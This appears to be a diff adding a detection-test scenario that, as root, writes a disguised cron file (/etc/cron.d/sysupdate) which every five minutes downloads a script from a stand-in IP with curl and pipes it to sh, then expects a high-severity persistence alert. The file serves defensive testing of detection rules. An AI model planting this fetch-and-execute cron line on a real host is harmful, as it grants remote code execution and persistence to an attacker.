@@ -1,0 +1,21 @@
+name: cron-download-exec
+description: A cron job downloads a script from an external address every 5 minutes and pipes it to sh.
+agent: black-host-01
+wait_s: 90
+steps:
+- host: black-host-01
+  user: root
+  run: echo '*/5 * * * * root curl -fsSL http://198.51.100.23/u.sh | sh' > /etc/cron.d/sysupdate
+cleanup:
+- host: black-host-01
+  user: root
+  run: rm -f /etc/cron.d/sysupdate
+expected:
+- rule_id: '554'
+  verdict: true_positive
+  severity: high
+  category: persistence
+  why: A root cron job piping a remote script to sh is a persistence and C2 pattern.
+  match:
+    syscheck.path: /etc/cron.d/sysupdate
+  needs_context: true
